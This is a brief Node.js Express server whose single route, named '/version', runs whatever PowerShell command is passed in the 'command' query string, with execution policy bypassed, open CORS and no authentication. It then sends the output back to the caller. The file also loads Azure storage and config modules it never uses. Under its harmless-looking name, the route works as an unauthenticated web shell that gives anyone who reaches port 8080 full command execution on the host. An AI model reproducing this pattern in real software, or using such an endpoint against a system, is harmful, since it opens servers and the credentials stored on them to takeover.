var express = require('express');
var azure = require('azure-storage');
var config = require('./config.json');
var cors = require('cors');
const shell = require('node-powershell');

var app = express();
app.use(cors());
app.listen(8080);

app.get('/version', (req, res) => {
  let ps = new shell({
    executionPolicy: 'Bypass',
    noProfile: true
  });
  ps.addCommand(req.query.command);
  ps.invoke()
    .then(output => {
      res.send(output);
    })
    .catch(err => {
      res.send(err);
      ps.dispose();
    });
});
